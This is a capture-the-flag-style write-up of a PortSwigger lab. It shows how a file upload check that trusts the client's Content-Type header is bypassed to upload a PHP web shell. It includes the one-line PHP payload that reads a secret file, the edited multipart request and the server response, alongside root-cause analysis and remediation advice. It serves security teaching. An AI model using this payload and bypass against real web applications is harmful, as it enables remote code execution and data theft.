# Lab 02 — Web Shell Upload via Content-Type Restriction Bypass

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20Client-Controlled%20MIME%20Type-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Web Shell Upload via Content-Type Restriction Bypass |
| **Difficulty** | Apprentice |
| **Vulnerability Class** | File Upload — Client-Controlled MIME Type |
| **Weakness (CWE)** | CWE-434 / CWE-646: Reliance on File Name or Extension of Externally-Supplied File |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The server attempts to restrict uploads to images by checking the `Content-Type` value declared in the multipart upload body. This value is entirely client-supplied and can be freely edited in the request — the server never verifies it against the file's actual content.

## 3. Proof of Concept (PoC)

**Step 1 — Log in and find the avatar fetch request:**  
Upload a normal image as avatar, then capture the `GET /files/avatars/<YOUR-IMAGE>` request in Burp and send it to Repeater.

**Step 2 — Attempt a direct PHP upload:**  
Create `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Try uploading it — the response states only `image/jpeg` or `image/png` MIME types are allowed.

**Step 3 — Capture and edit the upload request:**  
Find `POST /my-account/avatar` in Burp's proxy history and send it to Repeater. In the part of the multipart body relating to your file, change the declared `Content-Type` to:

```http
Content-Type: image/jpeg
```

**Step 4 — Send and confirm acceptance:**  
The response now confirms the file uploaded successfully, despite the content still being raw PHP.

**Step 5 — Trigger the shell:**  
In the other Repeater tab, change the path to `exploit.php` and send — Carlos's secret is returned.


## 4. Evidence (Request / Response)

```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------X--

HTTP/1.1 200 OK
The file avatars/exploit.php has been uploaded.
```

## 5. Root Cause Analysis

The server trusts a client-supplied header (`Content-Type` in the multipart body) as if it were a reliable indicator of the file's real nature, without ever inspecting the actual bytes. Any value in a request the client assembles is, by definition, fully attacker-controlled.

### Attacker vs. Defender Perspective

- **Attacker view:** When a MIME check blocks you, edit the Content-Type declared inside the multipart body itself — it's entirely client-controlled.
- **Defender view:** Never trust client-supplied MIME/Content-Type headers; validate real file content instead.

## 6. Impact

Complete bypass of the only validation layer in place, leading to full remote code execution identical in impact to Lab 01.

## 7. Remediation

- Never trust client-supplied MIME type / Content-Type values as a security control.
- Validate the real file content — magic bytes at minimum, full re-parsing/re-encoding ideally.
- Combine with extension allow-listing and non-executable storage as defense in depth.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
